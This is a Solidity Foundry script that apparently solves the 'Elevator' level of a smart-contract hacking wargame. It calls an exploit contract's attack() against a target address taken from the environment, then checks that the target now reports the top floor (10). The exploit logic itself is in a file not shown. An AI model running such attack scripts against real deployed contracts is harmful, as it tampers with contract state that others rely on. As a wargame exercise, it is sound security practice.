// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";
import {ElevatorExploit} from "../src/Elevator.e.sol";

contract ElevatorExploitAttackScript is Script {
    address public immutable EXPLOIT =
        vm.envAddress("EXPLOIT_CONTRACT_ADDRESS");
    address public immutable ELEVATOR =
        vm.envAddress("TARGET_CONTRACT_ADDRESS");

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        ElevatorExploit exploit = ElevatorExploit(EXPLOIT);

        exploit.attack();

        // Check results
        Elevator elevator = Elevator(ELEVATOR);
        assert(elevator.top() == true);
        assert(elevator.floor() == 10);

        vm.stopBroadcast();
    }
}
